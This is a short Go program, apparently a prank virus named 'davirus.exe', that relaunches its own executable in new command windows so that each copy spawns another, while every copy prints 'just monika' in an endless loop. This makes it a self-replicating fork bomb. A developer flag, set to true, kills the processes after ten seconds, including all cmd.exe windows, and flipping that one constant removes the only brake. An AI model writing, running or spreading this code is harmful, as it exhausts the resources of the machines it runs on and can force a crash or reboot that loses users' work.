package main

import (
	"fmt"
	"os"
	"os/exec"
	"time"
)

const DEV_MODE = true

func devKiller() {
	time.Sleep(10 * time.Second)
	_ = exec.Command("taskkill", "/F", "/IM", "cmd.exe", "/T").Run()
	_ = exec.Command("taskkill", "/F", "/IM", "davirus.exe", "/T").Run()
	_ = exec.Command("taskkill", "/F", "/IM", "main.exe", "/T").Run()
	os.Exit(0)
}

func main() {
	if DEV_MODE {
		go devKiller()
	}

	exePath, err := os.Executable()
	if err == nil {
		cmd := exec.Command("cmd.exe", "/c", "start", "cmd", "/k", exePath)
		_ = cmd.Start()
	}

	for {
		fmt.Println("just monika")
	}
}
